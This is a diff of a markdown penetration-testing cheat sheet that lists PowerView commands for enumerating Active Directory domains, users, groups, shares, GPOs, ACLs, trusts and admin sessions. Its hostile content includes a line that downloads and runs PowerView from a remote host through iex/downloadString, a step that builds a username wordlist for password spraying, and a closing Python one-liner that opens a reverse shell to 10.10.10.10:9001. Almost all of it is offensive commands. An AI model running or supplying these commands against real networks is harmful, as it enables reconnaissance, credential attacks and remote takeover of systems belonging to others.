@@ -18,17 +18,15 @@ permalink: /brainbox/
       iex(New-Object System.Net.WebClient).downloadString('http:/x.x.x.x./PowerView_DeV.ps1')
 ```
  <br>
- <span class="demo-highlight"># Get Domain & Domain Controller Information</span>
+ <span class="demo-highlight"># Domain & Controller Enumeration</span>
 
 ```powershell
-      Get-Domain 
-      
-      
-      Get-NetDomainController
-      Get-UserProperty -Properties logoncount | where logoncount | sort logoncount -Descending
+      Get-NetDomain 
+            
+      Get-NetDomainController     
 ```
 <br>
- <span class="demo-highlight"># Get User Information</span>
+ <span class="demo-highlight">#User Enumeration</span>
 
 ```powershell
       # Get all users present in the domain
@@ -36,28 +34,97 @@ permalink: /brainbox/
 
       # Get users sorted with most logoncounts
       Get-UserProperty -Properties logoncount | where logoncount | sort logoncount -Descending
-```
-<br>
-<span class="demo-highlight"># Get all the users in the domain and pipe their username to build a wordlist that could be used with crackmapexec later for spraying</span>
 
-```powershell
+      # Get all the users in the domain and pipe their username to build a wordlist that could be used with crackmapexec later for spraying
       Get-NetUsers | select samaccountname > username.txt
+
 ```
 <br>
-<span class="demo-highlight"># Get all the computers in the domain</span>
+<span class="demo-highlight">Group Enumeration </span>
 
 ```powershell
-Get-NetComputer
+# Get AD groups data either all or of a user
+Get-NetGroup [-Domain <target>] [-FullData] [-GroupName "*admin*"] [-Username 'user_name']
+
+#Get Members of a group
+Get-NetGroupMember [-GroupName 'group_name'] [-Recurse]	
 ```
 <br>
-<span class="demo-highlight"># Get information about specific computer</span>
+<span class="demo-highlight"># Share Enumeration</span>
 
 ```powershell
-Get-NetComputer -Identity <computer_name>
+    # Find interesting shares
+    Invoke-ShareFinder -ExcludeStandard -ExcludeIPC -ExcludePrint	
+
 ```
 <br>
+<span class="demo-highlight"># GPO Enumeration</span>
 
+```powershell
+# List all GPOs in the domain
+Get-NetGPO [-ComputerName <rat.domain>]	
 
+#Find Interesting GPO
+Get-NetGPOGroup
+
+```
+<br>
+<span class="demo-highlight"># OU Enumeration</span>
+
+```powershell
+    # Get all OU (Organisational Units) in the domain
+Get-NetOU [-FullData]
+
+# Get gplink of an OU to get GPOs applied to it
+(Get-NetOU -Name 'test').gplink	
+
+# Get GPO of a GPlink
+Get-NetGPO -GPOName '{cadkfapsdfasdfaudvajkd}'
+
+# Get GPO of an OU using gplink
+((Get-NetOU -FullData <OU_NAME>).gplink -split "cn=" -split ",")[1] | Get-NetGPO
+```
+<br>
+<span class="demo-highlight"># ACL Enumeration</span>
+
+```powershell
+    # Find interesting ACL
+Invoke-ACLScanner -ResolveGUIDS	
+
+# Find interesting ACL owned by a certain user :rat:
+Invoke-ACLScanner -ResolveGUIDS | ?{$_.IdentityReference -match 'rat'}	
+```
+<br>
+<span class="demo-highlight"># Trust Enumeration</span>
+
+```powershell
+    # Map all domain trust
+Get-NetDomainTrust [-Domain <target>]
+
+# Get all the domain of a forest
+Get-NetForestDomain [-Forest <target>]	
+```
+<br>
+<span class="demo-highlight"># Hunting Users and Sessions</span>
+
+```powershell
+# Get list of all machines where current user has local admin access
+Find-LocalAdminAccess	
+
+# Invoke-EnumerateLocalAdmin	
+Find all admins on all computers
+
+# Find machines where a domain admin has a session, checkaccess tells you if you also have access to that machine
+Invoke-UserHunter [-GroupName <group_name>] [-CheckAccess]	
+
+# Get list of active sessions on a computer
+Get-NetSession [-ComputerName <comp_name>]	
+
+# Get list of Users logged-on on a system
+Get-LoggedOnLocal [-ComputerName <comp_name>]	
+```
+
+<br>
 
 ```python
     python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
